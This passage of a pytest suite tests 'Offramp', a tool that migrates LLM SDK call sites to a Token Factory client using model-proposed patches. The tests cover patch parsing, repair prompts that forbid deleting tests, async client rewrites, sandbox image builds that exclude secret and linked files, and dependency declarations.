    """Re-review D3: where Offramp could not rewrite the call, the model wrote the evaluated keyword arguments
    with another user message. No model-written call is asked for or shipped now."""
    repo, _ = tiny_built()
    old = 'create(model="gpt-4o-mini", max_tokens=32, messages=messages)'
    say_hi = '[{"role": "system", "content": GREET_SYSTEM_PROMPT}, {"role": "user", "content": "Say hi."}]'
    wrong = Edit(path=GREET, search=old, replace=f"create({MIGRATED} max_tokens=32, messages={say_hi})")
    llm = patcher_llm(PatchEdits(edits=[wrong]))

    result = run(llm, repo=repo, name="tiny-d3-run", precheck=True)

    assert (
        verdict(result, "cs_01").decision == "MANUAL_REVIEW" and verdict(result, "cs_01").reason == FALLBACK
    )
    assert llm.calls == [] and all("Say hi." not in text for text in result.files.values())


DRIVEN = """GREET_SYSTEM_PROMPT = "You write one-line greetings."


async def greet(client, client_name: str, tone: str = "warm") -> str:
    response = await client.chat.completions.create(
        model="gpt-4o-mini",
        max_tokens=32,
        messages=[
            {"role": "system", "content": GREET_SYSTEM_PROMPT},
            {"role": "user", "content": f"Greet {client_name} in a {tone} way."},
        ],
    )
    return response.choices[0].message.content or ""
"""


def test_the_probe_drives_defaults_by_name_the_exact_client_and_async_functions():
    """Re-review 2 minors: p1 (a defaulted parameter the case sets), p2 (a data parameter named like the
    client), and an async function, run with asyncio.run."""
    repo = work_dir("probe-minors") / "src"
    shutil.copytree(TINY, repo)
    (repo / GREET).write_text(DRIVEN)
    variables = {"client_name": "Ana", "tone": "formal"}
    write_case(repo, "cs_01", variables, "You write one-line greetings.", "Greet Ana in a formal way.")

    result = run(patcher_llm(), repo=repo, name="probe-minors-run", precheck=True)

    assert (
        result.verification["cs_01"]
        == "probe: run in the sandbox with case cs_01:001, it sends the evaluated request"
    )
    assert verdict(result, "cs_01").decision == "MIGRATE"


def test_a_test_edit_reading_a_constant_offramp_wrote_gets_its_import():
    """Run 2, round 4: Ultra's cs_01 repair read NEMOTRON_FEW_SHOT in a test without importing it (ruff F821).
    The constants Offramp wrote are imported into edited tests like other auto-imports, never into code."""
    few = [{"role": "user", "content": "hi"}, {"role": "assistant", "content": "Hello there"}]
    uses = Edit(path=TESTS, search="def test_motto_returns_the_reply():",
                replace="def test_few_shot_is_sent():\n    assert NEMOTRON_FEW_SHOT\n\n\n"
                        "def test_motto_returns_the_reply():")  # fmt: skip
    llm = patcher_llm(migrate(GREET, extra=[uses]), migrate(SHOUT))

    result = run(llm, adapters=tiny_adapters(few_shot=few), name="constant-import", probed=False)

    assert verdict(result, "cs_01").decision == "MIGRATE"
    assert "from tinyapp.greet import NEMOTRON_FEW_SHOT\n" in result.files[TESTS]
    assert "from tinyapp.greet import NEMOTRON_FEW_SHOT" not in result.files[SHOUT]


# ---------------------------------------------------------------- repairs that name the problem; format slips


def test_a_repair_after_a_deleted_test_names_it_and_asks_for_a_rewrite_never_a_deletion():
    gone = Edit(path=TESTS, search="def test_greet_strips_the_reply():", replace="def _skipped():")
    llm = patcher_llm(PatchEdits(edits=[gone]), migrate(GREET), migrate(SHOUT))

    result = run(llm)

    repair = llm.calls[1]["messages"][-1]["content"]
    assert repair.startswith(  # the refusal itself stays
        f"Your edits were not accepted: patch rejected (patch rules): patch removes tests from {TESTS}: "
        "['test_greet_strips_the_reply']"
    )
    assert f"`{TESTS}::test_greet_strips_the_reply`" in repair
    assert "Never delete a test" in repair and "rewrite" in repair and "new Nemotron request" in repair
    assert "WHOLE FILE" not in repair  # no SEARCH miss: no whole-file offer
    assert verdict(result, "cs_01").decision == "MIGRATE"


def test_a_repair_after_a_search_miss_offers_the_whole_test_file():
    miss = Edit(path=TESTS, search="no such text", replace="x")
    llm = patcher_llm(PatchEdits(edits=[miss]), migrate(GREET), migrate(SHOUT))

    run(llm)

    repair = llm.calls[1]["messages"][-1]["content"]
    assert f"search text not found in {TESTS}" in repair
    assert f"`{TESTS}`" in repair.split("search text not found")[1]
    assert f"FILE: {TESTS}\n<<<<<<< WHOLE FILE\n" in repair and "\n>>>>>>> WHOLE FILE" in repair
    assert "Never delete a test" not in repair


def test_the_repair_offers_a_whole_file_only_for_test_files_under_300_lines():
    short, long = "def test_a():\n    pass\n", "x = 1\n" * 300
    shown = {"tests/test_a.py": short, "tests/test_long.py": long, "app/mod.py": short}

    def offered(path):
        return (
            "WHOLE FILE"
            in _repair(f"patch rejected (patch rules): search text not found in {path}: 'x'", shown, shown)[0]
        )

    assert offered("tests/test_a.py")
    assert not offered("tests/test_long.py") and not offered("app/mod.py") and not offered("tests/unseen.py")
    nested = (
        "the reply holds no complete edit block; last failure: patch rejected (patch rules): search text not "
        "found in tests/test_a.py (an earlier block already changed these lines: merge the two): 'x'"
    )
    assert (
        "`tests/test_a.py`" in _repair(nested, shown, shown)[0]
    )  # a miss in the last checked try counts too


def test_the_two_format_slips_seen_live_parse_and_content_is_not_loosened():
    block = "<<<<<<< SEARCH\nx = 1\n=======\nx = 2\n"
    files_line = "FILES: a.py\n" + block + "=======\n>>>>>>> REPLACE\nNOTES: n"  # cs_01's repair, live
    bare = (
        "FILE: a.py\n" + block + "=======\nREPLACE\n"  # cs_03's repairs, live: a bare REPLACE
        "FILE: b.py\n<<<<<<< SEARCH\ny = 1\n=======\nREPLACE_ME = 2\n>>>>>>> REPLACE\nNOTES: n"
    )

    assert [(e.path, e.search, e.replace) for e in parse_edits(files_line).edits] == [
        ("a.py", "x = 1", "x = 2")
    ]
    assert [(e.path, e.search, e.replace) for e in parse_edits(bare).edits] == [
        ("a.py", "x = 1", "x = 2"),  # the bare marker closes its own block, never the next one's
        ("b.py", "y = 1", "REPLACE_ME = 2"),  # a line that only starts with REPLACE is content
    ]
    near = Edit(path="t.py", search="x  = 1", replace="x = 2")  # the SEARCH text still matches exactly
    assert "not found" in _apply([near], {"t.py": "x = 1\n"})[0].text


@pytest.mark.parametrize(
    "replace",
    [
        "MSG = '''\nREPLACE\n'''",  # a REPLACE line inside a string (review P1)
        "Title\n=======",  # a final `=======` line: an RST underline (review P2)
        # a nested WHOLE FILE block after a REPLACE line (P3)
        "DOC = '''\nREPLACE\n<<<<<<< WHOLE FILE\nz = 3\n>>>>>>> WHOLE FILE\n'''",
    ],
    ids=["replace-line", "final-separator-line", "nested-whole-file"],
)
def test_a_strictly_valid_block_parses_exactly_as_before_whatever_its_content(replace):
    text = f"FILE: a.py\n<<<<<<< SEARCH\nx = 1\n=======\n{replace}\n>>>>>>> REPLACE\nNOTES: n"

    assert parse_edits(text).edits == [Edit(path="a.py", search="x = 1", replace=replace)]


def test_a_whole_file_block_round_trips_and_replaces_a_short_test_file():
    text = (TINY / TESTS).read_text().replace("def test_motto", "# whole file\ndef test_motto")
    whole = Edit(path=TESTS, search="", replace=text, whole=True)
    assert parse_edits(edits_text(PatchEdits(edits=[whole], notes="n"))).edits == [whole]
    llm = patcher_llm(PatchEdits(edits=[whole]), migrate(SHOUT))

    result = run(llm)

    assert verdict(result, "cs_01").decision == "MIGRATE"
    assert "# whole file" in result.files[TESTS]


@pytest.mark.parametrize(
    ("path", "lines", "problem"),
    [
        ("tests/test_long.py", 300, "has 300 lines: give SEARCH/REPLACE blocks"),
        ("app/mod.py", 3, "a whole-file block is for test files only"),
        ("tests/test_locked.py", 3, "is read-only"),
        ("tests/unseen.py", 3, "is not editable for this site"),
    ],
)
def test_whole_file_blocks_are_refused_outside_short_unlocked_test_files(path, lines, problem):
    files = {p: "x = 1\n" * lines for p in ("tests/test_long.py", "app/mod.py", "tests/test_locked.py")}
    whole = Edit(path=path, search="", replace="y = 2\n", whole=True)

    assert problem in _apply([whole], files, frozenset({"tests/test_locked.py"}))[0].text


def test_a_whole_file_block_that_drops_a_test_is_refused_like_a_search_block():
    text = (TINY / TESTS).read_text().split("def test_greet_strips_the_reply")[0]
    whole = Edit(path=TESTS, search="", replace=text, whole=True)
    llm = patcher_llm(PatchEdits(edits=[whole]), PatchEdits(edits=[whole]), migrate(SHOUT))

    result = run(llm)

    assert "patch removes tests from tests/test_tinyapp.py" in verdict(result, "cs_01").reason
    assert verdict(result, "cs_01").decision == "MANUAL_REVIEW"


def test_a_merge_conflict_is_recorded_as_one_not_as_a_check_failure():
    first = Edit(
        path=TESTS,
        search="from types import SimpleNamespace",
        replace="from types import SimpleNamespace  # a",
    )
    second = Edit(
        path=TESTS,
        search="from types import SimpleNamespace",
        replace="from types import SimpleNamespace  # b",
    )
    llm = patcher_llm(migrate(GREET, extra=[first]), migrate(SHOUT, extra=[second]))

    shout = verdict(run(llm), "cs_03")

    assert shout.reason == f"green alone, but its patch conflicts with another site's in {TESTS}"
    assert shout.patch_failure == PatchFailure(kind="merge_conflict", files=[TESTS])
    assert manual_reason(shout)[0] == (
        "Its patch passes this repo's checks on its own, but it conflicts with another migrated site's "
        f"patch in `{TESTS}`."
    )


# ---------------------------------------------------------------- Task 23: async sites, clients built inside

ASYNC_GREET = '''"""Write a one-line greeting (async, its client built inside, as real apps do)."""

import logging
import os

GREET_SYSTEM_PROMPT = "You write one-line greetings."
logger = logging.getLogger(__name__)


async def greet(name: str) -> str:
    try:
        import anthropic

        client = anthropic.AsyncAnthropic(api_key=os.environ.get("ANTHROPIC_API_KEY"), timeout=30.0)
        message = await client.messages.create(
            model="claude-haiku-4-5",
            temperature=0,
            max_tokens=32,
            system=GREET_SYSTEM_PROMPT,
            messages=[{"role": "user", "content": f"Greet {name}."}],
        )
        return message.content[0].text.strip()
    except Exception:
        logger.exception("greeting failed")
        return "Hello!"
'''
ASYNC_PARAMS = {"model": LIGHTNING, "max_tokens": 32, "temperature": 0.0, "extra_body": THINK_OFF}
ASYNC_SPEC = AdapterSpec(system_prompt="You write one-line greetings.", max_tokens=32, temperature=0.0)
CLIENT_MODULE = "tinyapp.offramp_client"
LOCAL_IMPORT = "        from tinyapp.offramp_client import token_factory_async_client\n"


def _built_site(function="greet", sdk="anthropic"):
    return CallSite(id="cs_01", file=GREET, lines=[1, 99], sdk=sdk, call="c", function=function,
                    prompt_source="fstring")  # fmt: skip


def _prepared(source, function="greet", sdk="anthropic"):
    """Offramp's own rewrite of a site, which must carry the evaluated request exactly."""
    site = _built_site(function, sdk)
    out, constants, system_name, rewritten, fixed = _prepare(
        source, site, ASYNC_SPEC, ASYNC_PARAMS, 100, client=CLIENT_MODULE
    )
    assert rewritten and fixed
    assert conformance(out, site, ASYNC_PARAMS, constants, system_name) == []
    return out


def test_an_async_site_that_builds_its_client_inside_is_rewritten_by_code():
    """The real shape (an app's FastAPI helpers): `import anthropic` inside the function, the client built
    there, the call awaited, the reply read as `message.content[0].text`."""
    out = _prepared(ASYNC_GREET)

    assert LOCAL_IMPORT in out  # where `import anthropic` was: still lazy, faked the same way
    assert "        client = token_factory_async_client(timeout=30.0)\n" in out  # the key goes, timeout stays
    assert "        message = await client.chat.completions.create(\n" in out  # await kept
    assert 'return (message.choices[0].message.content or "").strip()' in out
    assert "anthropic" not in out.lower() and "messages.create" not in out
    assert add_imports(out, CLIENT_MODULE) == out  # imported inside the function: no module-level twin


OPENAI_BUILT = """import openai

PROMPT = "You write one-line greetings."


async def greet(name):
    client = openai.AsyncOpenAI(max_retries=2)
    response = await client.chat.completions.create(
        model="gpt-4o-mini",
        max_tokens=32,
        messages=[{"role": "system", "content": PROMPT}, {"role": "user", "content": f"Greet {name}."}],
    )
    return response.choices[0].message.content
"""
SYNC_BUILT = """from anthropic import Anthropic

PROMPT = "You write one-line greetings."


def greet(name):
    client = Anthropic()
    response = client.messages.create(
        model="claude-haiku-4-5", max_tokens=32, system=PROMPT,
        messages=[{"role": "user", "content": f"Greet {name}."}],
    )
    return response.content[0].text
"""
CHAINED = (SYNC_BUILT.replace("import Anthropic", "import AsyncAnthropic")
           .replace("def greet", "async def greet").replace("    client = Anthropic()\n", "")
           .replace("client.messages", "await AsyncAnthropic(timeout=5).messages"))  # fmt: skip


@pytest.mark.parametrize(
    ("source", "sdk", "built"),
    [
        (OPENAI_BUILT, "openai", "    client = token_factory_async_client(max_retries=2)\n"),
        (SYNC_BUILT, "anthropic", "    client = token_factory_client()\n"),
        (CHAINED, "anthropic",
         "    response = await token_factory_async_client(timeout=5).chat.completions.create("),
    ],
    ids=["async-openai-module-import", "sync-anthropic", "async-chained"],
)  # fmt: skip
def test_a_client_built_inside_from_a_module_level_import_is_rewritten_too(source, sdk, built):
    out = _prepared(source, sdk=sdk)

    assert built in out
    factory = "token_factory_async_client" if "async" in built else "token_factory_client"
    assert f"from {CLIENT_MODULE} import {factory}\n" in add_imports(out, CLIENT_MODULE)  # at module level


MODULE_CLIENT = """import anthropic

PROMPT = "You write one-line greetings."
client = anthropic.AsyncAnthropic()


async def greet(name):
    message = await client.messages.create(
        model="claude-haiku-4-5", max_tokens=32, system=PROMPT, messages=[{"role": "user", "content": name}]
    )
    return message.content[0].text
"""


@pytest.mark.parametrize(
    ("source", "reason"),
    [
        (ASYNC_GREET.replace("timeout=30.0)", 'base_url="https://proxy.example")'), "`base_url=`"),
        (ASYNC_GREET.replace(".AsyncAnthropic(api_key=", ".Anthropic(api_key="),
         "the sync Token Factory client"),
        (MODULE_CLIENT, "built outside the function"),
    ],
    ids=["unknown-option", "sync-with-options", "module-level-client"],
)  # fmt: skip
def test_a_client_the_rewrite_cannot_build_the_same_way_is_refused(source, reason):
    with pytest.raises(Unsupported, match=re.escape(reason)):
        _rewrite_call(source, _built_site(), {}, "PROMPT", ASYNC_PARAMS, 100, client=CLIENT_MODULE)


def test_a_built_client_that_also_serves_another_call_is_a_manual_review_that_says_so():
    source = ASYNC_GREET.replace(
        "        message = await",
        "        await client.messages.count_tokens(model='m')\n        message = await",
    )

    with pytest.raises(Unsupported, match="its client `client` also serves other code in the function"):
        _rewrite_call(source, _built_site(), {}, None, ASYNC_PARAMS, 100, client=CLIENT_MODULE)


def test_the_async_client_module_adds_one_factory_and_leaves_the_sync_module_as_it_was():
    sync, both = client_module(), client_module(asynchronous=True, module=CLIENT_MODULE)

    assert "Async" not in sync  # sync-only repos ship (and prompt) exactly the module they did
    assert both.replace("from openai import AsyncOpenAI, OpenAI", "from openai import OpenAI").startswith(
        sync
    )
    factory = next(n for n in ast.parse(both).body if getattr(n, "name", "") == "token_factory_async_client")
    assert ast.unparse(factory.returns) == "AsyncOpenAI" and factory.args.kwarg.arg == "options"
    assert f'sys.modules["{CLIENT_MODULE}"]' in both  # how a test fakes it, as it faked the SDK
    assert max(len(line) for line in both.splitlines()) <= 79


def test_callers_and_fakes_of_an_async_client_get_the_async_factory():
    caller = (
        "from anthropic import AsyncAnthropic\n\nfrom tinyapp.greet import greet\n\n\n"
        "def main():\n    return asyncio.run(greet(AsyncAnthropic(), 'Ana'))\n"
    )
    out = rewrite_callers({"tinyapp/cli.py": caller}, GREET, "greet", CLIENT_MODULE)["tinyapp/cli.py"]
    assert "greet(token_factory_async_client(), 'Ana')" in out
    assert f"from {CLIENT_MODULE} import token_factory_async_client" in out
    test = 'def test_x(monkeypatch):\n    monkeypatch.setattr(cli, "AsyncAnthropic", lambda: Fake())\n'
    twin = mirror_fakes(test, {"cli"}, "AsyncAnthropic", "token_factory_async_client")
    assert '    monkeypatch.setattr(cli, "token_factory_async_client", lambda: Fake())\n' in twin


def async_tiny(name: str) -> Path:
    """The tiny repo with greet async, building its client inside, and tested the way the real app is: a
    fake `anthropic` module in sys.modules whose client is an AsyncMock."""
    repo = work_dir(name) / "src"
    shutil.copytree(TINY, repo, ignore=shutil.ignore_patterns(".venv", "__pycache__"))
    (repo / GREET).write_text(ASYNC_GREET)
    tests = (repo / TESTS).read_text().replace("from tinyapp.greet import greet\n", "")
    head, _, tail = tests.partition("def test_greet_strips_the_reply():")
    (repo / TESTS).write_text(head + tail.split("\n\n\n", 1)[1])
    (repo / "tests" / "test_greet.py").write_text(SYS_MODULES_TEST)
    write_case(repo, "cs_01", {"name": "Ana"}, "You write one-line greetings.", "Greet Ana.")
    return repo


SYS_MODULES_TEST = """import asyncio
from types import ModuleType, SimpleNamespace
from unittest.mock import AsyncMock, MagicMock, patch

from tinyapp.greet import greet


def _fake_anthropic(client):
    module = ModuleType("anthropic")
    module.AsyncAnthropic = MagicMock(return_value=client)
    return module


def test_greet_strips_the_reply(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "test-key")
    client = AsyncMock()
    reply = SimpleNamespace(content=[SimpleNamespace(type="text", text="  Hi Ana! ")])
    client.messages.create = AsyncMock(return_value=reply)

    with patch.dict("sys.modules", {"anthropic": _fake_anthropic(client)}):
        assert asyncio.run(greet("Ana")) == "Hi Ana!"

    assert client.messages.create.call_args.kwargs["model"] == "claude-haiku-4-5"
"""
# The model's job (a test edit): retarget the fake to Offramp's client module, in the same style.
RETARGETED = (SYS_MODULES_TEST
              .replace('def _fake_anthropic(client):\n    module = ModuleType("anthropic")\n'
                       "    module.AsyncAnthropic = MagicMock(return_value=client)\n",
                       f'def _fake_client_module(client):\n    module = ModuleType("{CLIENT_MODULE}")\n'
                       "    module.token_factory_async_client = MagicMock(return_value=client)\n")
              .replace('reply = SimpleNamespace(content=[SimpleNamespace(type="text", text="  Hi Ana! ")])',
                       'message = SimpleNamespace(content="  Hi Ana! ")\n'
                       "    reply = SimpleNamespace(choices=[SimpleNamespace(message=message)])")
              .replace("client.messages.create", "client.chat.completions.create")
              .replace('{"anthropic": _fake_anthropic(client)}',
                       f'{{"{CLIENT_MODULE}": _fake_client_module(client)}}')
              .replace('"claude-haiku-4-5"', f'"{LIGHTNING}"'))  # fmt: skip


def async_sites() -> list[CallSite]:
    return [s.model_copy(update={"sdk": "anthropic"}) if s.id == "cs_01" else s for s in tiny_sites()]


def test_an_async_site_migrates_end_to_end_and_the_model_is_told_how_to_fake_its_client():
    repo = async_tiny("async-fake")
    retarget = Edit(path="tests/test_greet.py", search="", replace=RETARGETED, whole=True)
    llm = patcher_llm(PatchEdits(edits=[retarget]), migrate(SHOUT))

    result = compose_patches(repo, async_sites(), tiny_verdicts(), tiny_adapters(), llm,
                             work_dir("async-fake-run"), config=CONFIG, build_request=BUILD,
                             sandbox_factory=lambda r: FakeSandbox(r, precheck=False))  # fmt: skip

    assert verdict(result, "cs_01").decision == "MIGRATE" and result.async_client
    assert (
        "def token_factory_async_client(**options) -> AsyncOpenAI:"
        in result.files["tinyapp/offramp_client.py"]
    )
    shipped = result.files[GREET]
    assert LOCAL_IMPORT in shipped and "await client.chat.completions.create(" in shipped
    prompt = llm.calls[0]["messages"][-1]["content"]
    assert "import token_factory_client, token_factory_async_client`" in prompt  # both factories named
    assert f'patch.dict("sys.modules", {{"{CLIENT_MODULE}": fake_module}})' in prompt  # how to fake it
    assert "def token_factory_async_client(" in prompt  # the module shown is the one that ships
    assert result.verification["cs_01"] == (
        "probe: run in the sandbox with case cs_01:001, it sends the evaluated request"
    )  # an async function, its client built inside, run with the recorder for that client


ASYNC_TIMEOUT = "token_factory_async_client(timeout=30.0)"
# An async site whose client is built inside: the client and its import ship as written. (parametrize reads
# SHAPES at collection, after the module ran.)
SHAPES.update({
    "async-client-option": shape(
        [Edit(path=GREET, search=ASYNC_TIMEOUT, replace=ASYNC_TIMEOUT.replace("30.0", "0.001"))],
        module=ASYNC_GREET),
    "async-client-import-rebound": shape(
        [Edit(path=GREET, search=LOCAL_IMPORT.strip(), replace=LOCAL_IMPORT.strip().replace(
            "import token_factory_async_client", "import token_factory_client as token_factory_async_client",
        ))],
        module=ASYNC_GREET),
})  # fmt: skip


# ---------------------------------------------------------------- Task 23: the sandbox on real repos


def fake_docker(monkeypatch, fail=lambda dockerfile, cmd: None):
    """subprocess.run for the sandbox: no image cached; `docker build` fails when `fail(Dockerfile, cmd)`
    returns an error text. Returns (docker run commands, build contexts as {path: text})."""
    runs, contexts, real_run = [], [], subprocess.run

    def fake_run(cmd, **kw):
        if cmd[0] == "git":  # which files are tracked: the real git
            return real_run(cmd, **kw)
        if cmd[:2] == ["docker", "build"]:
            ctx = Path(cmd[-1])
            contexts.append(
                {p.relative_to(ctx).as_posix(): p.read_text() for p in ctx.rglob("*") if p.is_file()}
            )
            error = fail(contexts[-1]["Dockerfile"], cmd)
            return subprocess.CompletedProcess(cmd, 1 if error else 0, "", error or "")
        if cmd[:2] == ["docker", "run"]:
            runs.append(cmd)
        return subprocess.CompletedProcess(cmd, 1 if cmd[:3] == ["docker", "image", "inspect"] else 0, "", "")

    monkeypatch.setattr(sandbox_module.subprocess, "run", fake_run)
    return runs, contexts


@pytest.mark.parametrize(
    ("files", "expected"),
    [
        ({"pyproject.toml": "[tool.ruff]\nline-length = 100\n"}, True),
        ({"pyproject.toml": "[tool.ruff.lint]\nselect = ['E']\n"}, True),
        ({"ruff.toml": ""}, True),
        ({".ruff.toml": ""}, True),
        ({".github/workflows/ci.yml": "steps:\n  - run: uv run ruff check .\n"}, True),
        ({".pre-commit-config.yaml": "repos:\n- repo: https://github.com/astral-sh/ruff-pre-commit\n"}, True),
        ({"pyproject.toml": "[project]\nname = 'x'\n\n[tool.pytest.ini_options]\naddopts = '-q'\n",
          ".github/workflows/ci.yml": "steps:\n  - run: uv run pytest -v\n"}, False),
        ({"pyproject.toml": "not toml ["}, False),
        ({}, False),
    ],
)  # fmt: skip
def test_ruff_counts_as_configured_only_where_the_repo_configures_or_runs_it(tmp_path, files, expected):
    for path, text in files.items():
        (tmp_path / path).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / path).write_text(text)

    assert configures_ruff(tmp_path) is expected


def test_a_linked_config_is_never_read(tmp_path):
    outside = tmp_path / "outside.toml"
    outside.write_text("[tool.ruff]\n")
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "pyproject.toml").symlink_to(outside)

    assert configures_ruff(repo) is False


@pytest.mark.parametrize("ruff", [True, False], ids=["ruff-configured", "no-linter"])
def test_ruff_runs_only_when_the_repo_configures_it_and_the_note_says_so(monkeypatch, tmp_path, ruff):
    (tmp_path / "pyproject.toml").write_text(
        "[project]\nname = 'x'\nversion = '0'\n" + ("[tool.ruff]\n" * ruff)
    )
    (tmp_path / "a.py").write_text("import os\n")
    runs, _ = fake_docker(monkeypatch)
    box = Sandbox(tmp_path, docker=True)

    result, formatted = box.check(), box.formatted()
    box.tidy(["a.py"])

    ruffs = [cmd for cmd in runs if "ruff" in cmd]
    assert result.ok and any("pytest" in cmd for cmd in runs)
    assert bool(ruffs) is ruff and (formatted is False if not ruff else True)
    assert box.notes == ([] if ruff else [NO_LINTER])


def test_the_image_installs_the_project_from_the_repos_regular_files_only(monkeypatch, tmp_path):
    """The project itself is installed, as its CI does, so src layouts import; the build context still takes
    only regular files: no link, pipe, .env file, .git or .venv."""
    repo = tmp_path / "repo"
    (repo / "src" / "pkg").mkdir(parents=True)
    (repo / "pyproject.toml").write_text("[project]\nname = 'pkg'\nversion = '0'\n")
    (repo / "src" / "pkg" / "__init__.py").write_text("VALUE = 1\n")
    for secret in (".env", ".env.local", ".git/config", ".venv/pyvenv.cfg", "node_modules/x.js"):
        (repo / secret).parent.mkdir(parents=True, exist_ok=True)
        (repo / secret).write_text("canary-secret-123")
    (tmp_path / "outside.txt").write_text("canary-secret-123")
    (repo / "data.txt").symlink_to(tmp_path / "outside.txt")
    os.mkfifo(repo / "pipe")  # copying a pipe would block forever
    _, contexts = fake_docker(monkeypatch)

    Sandbox(repo, docker=True).check()

    files = contexts[0]
    assert files["repo/src/pkg/__init__.py"] == "VALUE = 1\n" and "deps/pyproject.toml" in files
    assert not any("canary" in text for text in files.values())
    assert not any(p.startswith("repo/") and p[5:] in ("data.txt", "pipe") for p in files)
    dockerfile = files["Dockerfile"]
    assert (
        dockerfile.index("COPY deps/ ./")
        < dockerfile.index("COPY repo/ ./")
        < dockerfile.index("uv sync --inexact")
    )
    assert "--no-install-project" in dockerfile.split("COPY repo/ ./")[0]  # dependencies first, cached apart


def test_a_project_that_does_not_install_keeps_todays_image_and_says_so(monkeypatch, tmp_path):
    (tmp_path / "pyproject.toml").write_text("[project]\nname = 'x'\nversion = '0'\n")
    runs, contexts = fake_docker(
        monkeypatch, lambda dockerfile, cmd: None if "--target" in cmd else "no version"
    )
    box = Sandbox(tmp_path, docker=True)

    result = box.check()

    assert result.ok and runs and all(cmd[cmd.index("/repo") + 1].endswith("-deps") for cmd in runs)
    assert "this repo's own package did not install in the sandbox" in box.notes[-1]


def test_a_python_version_that_does_not_build_falls_back_to_the_newest_that_does(monkeypatch, tmp_path):
    (tmp_path / ".python-version").write_text("3.14\n")
    (tmp_path / "pyproject.toml").write_text(
        "[project]\nname = 'x'\nversion = '0'\nrequires-python = '>=3.11'\n"
    )
    tried = []

    def fail(dockerfile, cmd):
        python = re.search(r"uv:python(\S+)-bookworm", dockerfile)[1]
        tried.append(python)
        return "no wheel for this Python" if python == "3.14" else None

    _, contexts = fake_docker(monkeypatch, fail)
    box = Sandbox(tmp_path, docker=True)

    result = box.check()

    assert result.ok and tried[0] == "3.14" and set(tried[1:]) == {"3.13"}
    assert "UV_PYTHON=3.13" in contexts[-1]["Dockerfile"]  # uv takes the image's Python, not .python-version
    assert box.notes[-1] == (
        ".python-version asks for Python 3.14, whose sandbox image did not build; Offramp ran the checks "
        "on Python 3.13, the newest that built"
    )


def test_when_no_python_builds_the_first_failure_is_reported(monkeypatch, tmp_path):
    fake_docker(
        monkeypatch, lambda dockerfile, cmd: "failed on " + re.search(r"uv:python(\S+)-", dockerfile)[1]
    )

    result = Sandbox(tmp_path, docker=True).check()

    assert not result.ok and "failed on 3.12" in result.output and "failed on 3.13" not in result.output


# ---------------------------------------------------------------- Task 23 round 0: dependency, keys, location


@pytest.mark.parametrize(
    ("sources", "expected"),
    [
        ({"api/main.py": "import db\n", "api/db.py": ""}, ("api/offramp_client.py", "offramp_client")),
        ({"api/report.py": "import os\n"}, ("api/offramp_client.py", "api.offramp_client")),
        ({"src/app.py": ""}, ("src/offramp_client.py", "offramp_client")),
        ({"api/a.py": "", "jobs/b.py": ""}, ("offramp_client.py", "offramp_client")),
    ],
    ids=["folder-on-sys-path", "folder-by-dotted-path", "src-folder", "two-folders"],
)
def test_a_client_for_sites_in_a_plain_folder_sits_beside_them_imported_as_they_import_each_other(
    sources, expected
):
    """The demo target's sites sit in `api/` (no __init__.py), whose modules `import db`: the client goes in
    api/ and is imported by bare name, never as a top-level `offramp` package."""
    repo = work_dir("location-folders")
    for path, text in sources.items():
        (repo / path).parent.mkdir(parents=True, exist_ok=True)
        (repo / path).write_text(text)
    sites = [p for p in sources if not p.endswith("db.py")]

    assert client_location(repo, sites) == expected


def anthropic_tiny(name: str, extra: dict[str, str] | None = None, module: str = PLANT) -> Path:
    """The tiny repo with greet an Anthropic site, plus `extra` files."""
    repo = work_dir(name) / "src"
    shutil.copytree(TINY, repo, ignore=shutil.ignore_patterns(".venv", "__pycache__"))
    (repo / GREET).write_text(module)
    for path, text in (extra or {}).items():
        (repo / path).parent.mkdir(parents=True, exist_ok=True)
        (repo / path).write_text(text)
    return repo


def compose_anthropic(repo: Path, name: str, llm=None, box=None):
    sites = [s.model_copy(update={"sdk": "anthropic"}) if s.id == "cs_01" else s for s in tiny_sites()]
    llm = llm or patcher_llm()
    return compose_patches(repo, sites, tiny_verdicts(), tiny_adapters(), llm, work_dir(name),
                           config=CONFIG, build_request=BUILD,
                           sandbox_factory=box or (lambda r: FakeSandbox(r, precheck=True)))  # fmt: skip


TINY_PYPROJECT = (TINY / "pyproject.toml").read_text()
DEPS = 'dependencies = [\n    "anthropic>=0.40",\n    "httpx>=0.27",\n]'
DEPS_WITH_OPENAI = DEPS.replace('"anthropic>=0.40",', '"anthropic>=0.40",\n    "openai>=1.50",')


@pytest.mark.parametrize(
    ("files", "path", "expected"),
    [
        ({"requirements.txt": "anthropic>=0.40.0,<1.0.0\nhttpx\n"}, "requirements.txt",
         "anthropic>=0.40.0,<1.0.0\nopenai>=1.50\nhttpx\n"),
        ({"api/requirements.txt": "fastapi\nanthropic>=0.40.0,<1.0.0"}, "api/requirements.txt",
         "fastapi\nanthropic>=0.40.0,<1.0.0\nopenai>=1.50\n"),
        ({"pyproject.toml": TINY_PYPROJECT.replace("dependencies = []", DEPS)}, "pyproject.toml",
         TINY_PYPROJECT.replace("dependencies = []", DEPS_WITH_OPENAI)),
    ],
    ids=["requirements", "requirements-in-a-folder", "pyproject-with-uv-lock"],
)  # fmt: skip
def test_the_openai_sdk_is_declared_where_the_replaced_sdk_is_and_ships_with_the_migration(
    files, path, expected
):
    """The migrated code imports openai (through Offramp's client module): code adds it beside the replaced
    SDK, in that file's layout; a lockfile is never edited, and the PR says how to regenerate it."""
    name = f"declare-{path.replace('/', '-')}"
    repo = anthropic_tiny(name, files)

    result = compose_anthropic(repo, f"{name}-run")

    assert verdict(result, "cs_01").decision == "MIGRATE"
    assert result.files[path] == expected
    assert result.change_notes[0].startswith(f"`{path}`: added `openai>=1.50` beside `anthropic`")
    assert "uv.lock" not in result.files  # the tiny repo has one: never edited
    pyproject = path == "pyproject.toml"
    assert (
        any("`uv.lock` is not regenerated by Offramp: run `uv lock`" in n for n in result.change_notes)
        is pyproject
    )


def test_without_a_migration_the_dependency_edit_does_not_ship():
    repo = anthropic_tiny("declare-none", {"requirements.txt": "anthropic\n"})
    verdicts = [v.model_copy(update={"decision": "KEEP_CLOSED"}) for v in tiny_verdicts()]
    sites = [s.model_copy(update={"sdk": "anthropic"}) if s.id == "cs_01" else s for s in tiny_sites()]

    work = work_dir("declare-none-run")
    result = compose_patches(repo, sites, verdicts, tiny_adapters(), patcher_llm(), work, config=CONFIG,
                             build_request=BUILD, sandbox_factory=FakeSandbox)  # fmt: skip

    assert "requirements.txt" not in result.files and result.change_notes == []


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ('[dependency-groups]\nai = ["anthropic>=0.40", "x"]\n',
